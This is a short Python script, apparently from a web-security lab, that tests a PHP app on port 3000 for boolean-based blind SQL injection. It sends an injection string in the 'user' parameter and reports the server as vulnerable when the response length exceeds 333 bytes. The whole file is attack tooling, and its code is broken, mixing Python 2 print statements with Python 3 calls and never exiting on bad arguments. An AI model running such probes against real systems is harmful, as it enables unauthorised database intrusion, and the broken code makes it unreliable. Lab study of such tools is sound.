import sys
import re
import requests
from bs4 import BeautifulSoup

def search_sqli(ip, inj_str):
    target = "http://%s:3000/sqliblind_boolean_app.php?user=%s" % (ip, inj_str)
    print("target : ",target)
    r = requests.get(target)
    s = BeautifulSoup(r.text, 'lxml')
    print("Response Headers: ",r.headers)
    print("Content-Length : ", int(r.headers['Content-Length']))
    if int(r.headers['Content-Length']) > 333:
    	print("The server is vulnerable to blind injection ", inj_str)
    else:
    	print("The server is not vulnerable ")
   

def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <injection_string>" % sys.argv[0]
        print '(+) eg: %s 127.0.0.1 "aaaa\'" ' %sys.argv[0]
    ip = sys.argv[1]
    injection_string = sys.argv[2]

    search_sqli(ip, injection_string)

if __name__ == "__main__":
    main()
